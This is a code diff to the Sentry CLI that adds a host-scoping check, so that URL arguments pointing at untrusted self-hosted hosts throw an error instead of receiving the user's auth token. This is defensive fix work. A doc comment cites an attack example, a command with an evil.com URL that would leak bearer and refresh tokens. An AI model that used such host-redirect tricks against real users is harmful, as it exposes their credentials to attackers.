@@ -10,7 +10,9 @@
 
 import { DEFAULT_SENTRY_HOST } from "./constants.js";
 import { getEnv } from "./env.js";
+import { CliError } from "./errors.js";
 import { isSentrySaasUrl } from "./sentry-urls.js";
+import { getActiveTokenHost, isHostTrusted } from "./token-host.js";
 
 /**
  * Components extracted from a Sentry web URL.
@@ -212,13 +214,26 @@ export function parseSentryUrl(input: string): ParsedSentryUrl | null {
 /**
  * Configure `SENTRY_URL` for self-hosted instances detected from a parsed URL.
  *
- * Sets the env var when the URL is NOT a Sentry SaaS domain (*.sentry.io),
- * since SaaS uses multi-region routing instead.
+ * Host-scoping trust check (see plan
+ * `.opencode/plans/1777023782662-proud-circuit.md`):
  *
- * The parsed URL always takes precedence over any existing `SENTRY_URL` value
- * because an explicit URL argument is the strongest signal of user intent.
+ * - SaaS URLs (`*.sentry.io`) always proceed. Credentials scoped to SaaS are
+ *   valid for any regional silo or org subdomain, so there's nothing to leak.
+ * - Non-SaaS URLs require the trust check: if any active token exists, its
+ *   scoped host MUST match `baseUrl` (with SaaS equivalence for tokens that
+ *   happen to be SaaS, though non-SaaS baseUrl never matches SaaS tokens).
+ *   Mismatch or no-token-at-all → throw `CliError`. Only `sentry auth login
+ *   --url <url>` establishes trust for a new host.
+ *
+ * This closes the reported CVE class where a URL argument like
+ * `sentry issue view https://evil.com/...` would unconditionally set
+ * `env.SENTRY_HOST`, causing the subsequent authenticated request to leak
+ * the bearer (and potentially refresh) token to the attacker.
  *
  * @param baseUrl - The scheme + host extracted from the URL (e.g., "https://sentry.example.com")
+ * @throws {CliError} When `baseUrl` is non-SaaS and doesn't match the active
+ *   token's scoped host, or when no token is stored/configured and the URL
+ *   is non-SaaS.
  */
 export function applySentryUrlContext(baseUrl: string): void {
   const env = getEnv();
@@ -231,6 +246,45 @@ export function applySentryUrlContext(baseUrl: string): void {
     delete env.SENTRY_URL;
     return;
   }
+
+  // Non-SaaS URL — enforce host-scoping.
+  const tokenHost = getActiveTokenHost();
+  if (!(tokenHost && isHostTrusted(baseUrl, tokenHost))) {
+    throw new CliError(
+      buildUrlMismatchMessage("URL argument", baseUrl, tokenHost)
+    );
+  }
+
   env.SENTRY_HOST = baseUrl;
   env.SENTRY_URL = baseUrl;
+}
+
+/**
+ * Build the standard "host mismatch" error message used by
+ * {@link applySentryUrlContext} and (re-exported for) the `.sentryclirc` shim.
+ *
+ * @param source - Short human-readable description of where the URL came from
+ *   (e.g., `"URL argument"`, `"Config at /path/to/.sentryclirc"`).
+ * @param baseUrl - The URL that doesn't match the active token.
+ * @param tokenHost - The active token's scoped host, or `undefined` when no
+ *   token exists (the "no token" case needs a different action hint).
+ */
+export function buildUrlMismatchMessage(
+  source: string,
+  baseUrl: string,
+  tokenHost: string | undefined
+): string {
+  if (tokenHost === undefined) {
+    return (
+      `${source}: ${baseUrl}\n` +
+      "Refusing to route requests to this host because no Sentry credentials are configured for it.\n" +
+      `To use this host, run: sentry auth login --url ${baseUrl}`
+    );
+  }
+  return (
+    `${source}: ${baseUrl}\n` +
+    `Refusing to route requests here because it doesn't match the host your Sentry credentials are for (${tokenHost}).\n` +
+    `To use this host, run: sentry auth login --url ${baseUrl}\n` +
+    "To keep using your current credentials, remove this URL override."
+  );
 }
